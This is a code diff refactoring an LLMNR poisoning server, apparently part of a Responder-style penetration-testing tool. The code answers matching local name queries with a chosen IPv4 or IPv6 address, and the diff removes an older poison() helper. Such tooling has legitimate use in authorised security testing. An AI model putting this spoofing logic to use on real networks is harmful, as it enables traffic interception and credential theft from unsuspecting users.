@@ -76,19 +76,16 @@ class LLMNR(ResponderServer):
 					for q in packet.Questions:
 						if targetRE.match(q.QNAME.name):
 							self.logPoisonResult(session, requestName = q.QNAME.name, poisonName = str(targetRE), poisonIP = ip)
-							res = DNSResource()
 							if ip.version == 4:
-								#BE AWARE THIS IS NOT CHECKING IF THE QUESTION AS FOR IPV4 OR IPV6!!!
-								res.construct(q.QNAME.name, DNSType.A, ip)
+								res = DNSAResource.construct(q.QNAME.name, ip)
 							elif ip.version == 6:
-								res.construct(q.QNAME.name, DNSType.AAAA, ip) #not tested, but should work
+								res = DNSAAAAResource.construct(q.QNAME.name, ip)
 							else:
 								raise Exception('This IP version scares me...')
 							#res.construct(q.QNAME, NBRType.NB, ip)
 							answers.append(res)
 				
-				response = LLMNRPacket()
-				response.construct(  TID = packet.TransactionID, 
+				response = LLMNRPacket.construct(  TID = packet.TransactionID, 
 									 response = LLMNRResponse.RESPONSE, 
 									 answers = answers,
 									 questions = packet.Questions
@@ -101,20 +98,6 @@ class LLMNR(ResponderServer):
 			traceback.print_exc()
 			self.log(logging.INFO,'Exception! %s' % (str(e),))
 			pass
-
-	
-	def poison(self, requestPacket, poisonAddr, poisonName = None):
-		self.log(logging.DEBUG,'Poisoning!')
-		res = DNSResource()
-		res.construct(requestPacket.Questions[0].QNAME.name, DNSType.A, poisonAddr)
-		pp = LLMNRPacket()
-
-		pp.construct(TID = requestPacket.TransactionID, 
-					 response = LLMNRResponse.RESPONSE, 
-					 answers = [res],
-					 questions = requestPacket.Questions)
-
-		return pp
 		
 
 
